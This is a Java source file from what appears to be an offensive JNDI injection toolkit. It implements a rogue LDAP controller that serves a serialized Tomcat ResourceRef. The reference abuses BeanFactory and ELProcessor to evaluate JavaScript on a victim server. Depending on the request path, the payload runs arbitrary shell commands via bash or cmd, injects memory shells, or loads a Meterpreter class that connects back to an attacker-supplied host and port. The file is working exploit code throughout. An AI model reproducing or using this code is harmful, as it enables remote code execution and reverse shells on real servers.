package com.qi4l.JYso.controllers;

import com.qi4l.JYso.enumtypes.GadgetType;
import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.Config.Config;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.InjShell;
import com.qi4l.JYso.gadgets.utils.Util;
import com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;
import org.fusesource.jansi.Ansi;

import javax.naming.StringRefAddr;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.Locale;

import static org.fusesource.jansi.Ansi.ansi;


@LdapMapping(uri = {"/elprocessor"})
public class ELProcessorController implements LdapController {
    private static final String SCRIPT_TEMPLATE = "{\"\".getClass().forName(\"javax.script.ScriptEngineManager\")"
            + ".newInstance().getEngineByName(\"JavaScript\")"
            + ".eval(\"%s\")}";

    private String payloadType;
    // 记录解析请求时提取出的命令参数或回连信息。
    private String[] params = new String[0];
    private GadgetType gadgetType;

    // 向 LDAP 客户端返回序列化后的 ELProcessor 引用。
    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        try {
            Entry entry = new Entry(base);
            entry.addAttribute("javaClassName", "java.lang.String");

            ResourceRef ref = new ResourceRef(
                    "javax.el.ELProcessor",
                    null,
                    "",
                    "",
                    true,
                    "org.apache.naming.factory.BeanFactory",
                    null
            );
            ref.add(new StringRefAddr("forceString", "x=eval"));
            ref.add(new StringRefAddr("x", buildPayloadScript()));

            entry.addAttribute("javaSerializedData", Util.serialize(ref));
            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Throwable er) {
            System.err.println("Error while generating or serializing payload");
            er.printStackTrace();
        }
    }

    // 解析请求路径，确定 payload 类型及其所需参数。
    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        System.out.println("- JNDI LDAP Local Refenrence Links + ELProcessor");
        try {
            String normalized = base.replace('\\', '/');
            payloadType = segment(normalized, 1);
            if (payloadType.isEmpty()) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + normalized);
            }
            System.out.println(Ansi.ansi().fgBrightMagenta().a("  Paylaod: " + payloadType).reset());

            gadgetType = parseGadgetType(normalized);
            params = resolveParams(normalized);
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }

    // 构造注入到 ELProcessor 中的 JavaScript 代码。
    private String buildPayloadScript() throws Exception {
        TomcatBypassHelper helper = new TomcatBypassHelper();
        String scriptBody;

        if (payloadType.contains("E-")) {
            Class<?> echoClass = Class.forName(ClassNameHandler.searchClassByName(suffixAfterDash(payloadType)));
            scriptBody = InjShell.injectClass(echoClass);
        } else if (payloadType.contains("M-")) {
            InjShell.init(params);
            scriptBody = Gadgets.createClassT(suffixAfterDash(payloadType));
        } else if (payloadType.contains("command")) {
            scriptBody = helper.getExecCode(params[0]);
        } else if (payloadType.contains("msf")) {
            scriptBody = helper.injectMeterpreter();
        } else {
            throw new UnSupportedPayloadTypeException("Unsupported payload flag: " + payloadType);
        }

        return SCRIPT_TEMPLATE.replace("%s", scriptBody.replace("\"", "\\\""));
    }

    // 解析路径中的 gadget 片段并转换为枚举。
    private GadgetType parseGadgetType(String base) throws UnSupportedPayloadTypeException {
        String segment = segment(base, 2);
        if (segment.isEmpty()) return null;

        try {
            return GadgetType.valueOf(segment.toLowerCase(Locale.ROOT));
        } catch (IllegalArgumentException ignored) {
            throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + segment);
        }
    }

    // 根据不同 gadget 类型构建命令参数或回连配置。
    private String[] resolveParams(String base) throws Exception {
        if (gadgetType == null) return new String[0];

        switch (gadgetType) {
            case base64:
                String cmd = Util.getCmdFromBase(base);
                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
                return new String[]{cmd};
            case shell:
                String encoded = Util.getCmdFromBase(base);
                String decoded = new String(Util.base64Decode(encoded));
                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + decoded).reset());
                return decoded.split(" ");
            case msf:
                String[] results = Util.getIPAndPortFromBase(base);
                Config.rhost = results[0];
                Config.rport = results[1];
                System.out.println("[+] RemotHost: " + results[0]);
                System.out.println("[+] RemotPort: " + results[1]);
                return results;
            default:
                return new String[0];
        }
    }

    // 提取路径中的第 index 个非空段，保持与原有解析方式一致。
    private String segment(String base, int index) {
        int cursor = 0;
        int found = 0;
        while (cursor < base.length()) {
            int next = base.indexOf('/', cursor);
            if (next == -1) next = base.length();

            if (next > cursor) {
                if (found == index) {
                    return base.substring(cursor, next);
                }
                found++;
            }
            cursor = next + 1;
        }
        return "";
    }

    // 返回连字符后的子串，用于解析自定义类名。
    private String suffixAfterDash(String value) {
        int dashIndex = value.indexOf('-');
        return dashIndex >= 0 ? value.substring(dashIndex + 1) : value;
    }

    // 封装 Tomcat 环境下 ELProcessor 的注入辅助逻辑，保持主控制器简洁。
    private class TomcatBypassHelper {
        String injectMeterpreter() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
            Class<?> clazz = Class.forName("com.qi4l.JYso.template.Meterpreter");
            Field host = clazz.getDeclaredField("host");
            host.setAccessible(true);
            host.set(clazz, params[0]);

            Field port = clazz.getDeclaredField("port");
            port.setAccessible(true);
            port.set(clazz, params[1]);
            return InjShell.injectClass(clazz);
        }

        String getExecCode(String cmd) throws IOException {
            return "var strs=new Array(3);\n"
                    + "        if(java.io.File.separator.equals('/')){\n"
                    + "            strs[0]='/bin/bash';\n"
                    + "            strs[1]='-c';\n"
                    + "            strs[2]='" + cmd + "';\n"
                    + "        }else{\n"
                    + "            strs[0]='cmd';\n"
                    + "            strs[1]='/C';\n"
                    + "            strs[2]='" + cmd + "';\n"
                    + "        }\n"
                    + "        java.lang.Runtime.getRuntime().exec(strs);";
        }
    }
}
